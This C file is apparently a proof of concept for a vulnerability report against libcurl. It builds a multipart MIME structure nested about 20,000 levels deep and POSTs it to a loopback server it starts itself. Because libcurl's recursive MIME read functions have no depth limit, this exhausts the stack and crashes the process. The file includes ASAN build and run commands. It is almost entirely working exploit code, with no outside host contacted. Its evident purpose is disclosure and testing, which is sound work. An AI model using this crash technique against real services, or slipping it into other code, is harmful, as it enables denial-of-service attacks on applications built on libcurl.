/*
 *
 * When curl_easy_perform() sends a MIME POST it internally calls:
 *   Curl_mime_read -> readback_part -> read_part_content (MIMEKIND_MULTIPART)
 *   -> mime_subparts_read -> readback_part -> ... (no depth limit)
 *
 * At ~9500+ nesting levels this exhausts the 8 MB default thread stack.
 * Under ASAN (5x frame inflation) use depth >= 20000.
 *
 * Build:
 *   clang -fsanitize=address -fno-omit-frame-pointer -g -O1 poc.c \
 *     -I/path/to/curl/include /path/to/libcurl.a \
 *     -lssl -lcrypto -lz -lpthread -ldl -o poc
 *
 * Run:
 *   ASAN_OPTIONS='halt_on_error=1:print_stacktrace=1:detect_leaks=0' ./poc 20000
 */

#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>

/* Minimal loopback HTTP/1.1 server — accepts one connection, drains it. */
static void *accept_and_drain(void *arg)
{
    int listenfd = *(int *)arg;
    struct sockaddr_in peer;
    socklen_t plen = sizeof(peer);
    int connfd = accept(listenfd, (struct sockaddr *)&peer, &plen);
    if (connfd >= 0) {
        const char *resp =
            "HTTP/1.1 200 OK\r\n"
            "Content-Length: 0\r\n"
            "Connection: close\r\n\r\n";
        (void)send(connfd, resp, strlen(resp), 0);
        char buf[4096];
        while (recv(connfd, buf, sizeof(buf), 0) > 0)
            ;
        close(connfd);
    }
    close(listenfd);
    return NULL;
}

int main(int argc, char **argv)
{
    int depth = argc > 1 ? atoi(argv[1]) : 10000;

    /* Bind a loopback listener so curl_easy_perform() has somewhere to connect. */
    int listenfd = socket(AF_INET, SOCK_STREAM, 0);
    if (listenfd < 0) { perror("socket"); return 1; }
    int optval = 1;
    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port        = 0;  /* OS picks a free port */
    if (bind(listenfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { perror("bind"); return 1; }
    listen(listenfd, 1);
    socklen_t alen = sizeof(addr);
    getsockname(listenfd, (struct sockaddr *)&addr, &alen);
    int port = ntohs(addr.sin_port);

    pthread_t tid;
    pthread_create(&tid, NULL, accept_and_drain, &listenfd);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if (!curl) { fprintf(stderr, "curl_easy_init failed\n"); return 1; }

    /* Build an N-deep nested multipart MIME tree using public API. */
    fprintf(stderr, "[PoC] Building %d-deep nested multipart MIME structure\n", depth);
    curl_mime *inner = curl_mime_init(curl);
    curl_mimepart *leaf = curl_mime_addpart(inner);
    curl_mime_data(leaf, "leaf", CURL_ZERO_TERMINATED);

    for (int i = 0; i < depth; i++) {
        curl_mime *outer = curl_mime_init(curl);
        curl_mimepart *p  = curl_mime_addpart(outer);
        CURLcode rc = curl_mime_subparts(p, inner);
        if (rc != CURLE_OK) {
            fprintf(stderr, "curl_mime_subparts failed at depth %d: %s\n",
                    i, curl_easy_strerror(rc));
            break;
        }
        inner = outer;
    }

    /*
     * POST the nested structure via the documented public API.
     * curl_easy_perform() internally drives the MIME read chain:
     *   readback_part -> read_part_content (MIMEKIND_MULTIPART) ->
     *   mime_subparts_read -> readback_part -> ...  (depth times)
     * This causes stack exhaustion at ~9500+ levels.
     */
    char url[64];
    snprintf(url, sizeof(url), "http://127.0.0.1:%d/", port);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, inner);  /* documented public API */

    fprintf(stderr, "[PoC] Triggering MIME read via curl_easy_perform()...\n");
    CURLcode res = curl_easy_perform(curl);

    if (res == CURLE_OK)
        fprintf(stderr, "[PoC] Completed without crash (depth %d may be too shallow)\n", depth);
    else
        fprintf(stderr, "[PoC] curl_easy_perform returned: %s\n", curl_easy_strerror(res));

    pthread_join(tid, NULL);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
